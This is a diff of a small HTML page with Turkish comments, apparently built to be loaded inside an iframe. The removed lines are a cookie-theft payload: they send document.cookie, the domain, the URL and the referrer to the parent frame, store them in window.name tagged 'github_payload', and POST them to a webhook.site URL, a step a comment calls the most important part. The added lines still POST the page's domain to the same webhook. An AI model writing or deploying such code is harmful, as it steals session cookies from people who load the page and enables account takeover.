@@ -1,49 +1,16 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Test Page</title>
-</head>
 <body>
-    <h1>Testing Cross-Frame Communication</h1>
-    
+    <h1>IFRAME LOADED</h1>
     <script>
-    // Parent frame'e mesaj gönder
-    try {
-        window.parent.postMessage({
-            type: 'test',
-            cookies: document.cookie,
-            domain: document.domain,
-            url: window.location.href,
-            timestamp: new Date().toISOString()
-        }, '*');
-        
-        console.log('Message sent to parent frame');
-    } catch(e) {
-        console.log('Error:', e);
-    }
+    // Direkt sayfa yüklenince çalış
+    document.body.innerHTML += '<p>JavaScript working</p>';
     
-    // Window.name ile de dene
-    window.name = JSON.stringify({
-        cookies: document.cookie,
-        test: 'github_payload'
-    });
-
-    // Webhook'a direkt gönder - EN ÖNEMLİ KISIM
-    fetch('https://webhook.site/702e64e6-a3b1-4c90-b2ff-d53f3db32498', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            cookies: document.cookie,
-            domain: document.domain,
-            referrer: document.referrer,
-            iframe_test: true,
-            parent_domain: window.parent.location.hostname
-        })
-    }).then(() => {
-        console.log('Data sent to webhook');
-    }).catch(e => {
-        console.log('Webhook error:', e);
-    });
+    // Çok basit webhook testi
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'https://webhook.site/702e64e6-a3b1-4c90-b2ff-d53f3db32498');
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send('{"test":"simple","domain":"' + document.domain + '"}');
     </script>
 </body>
 </html>
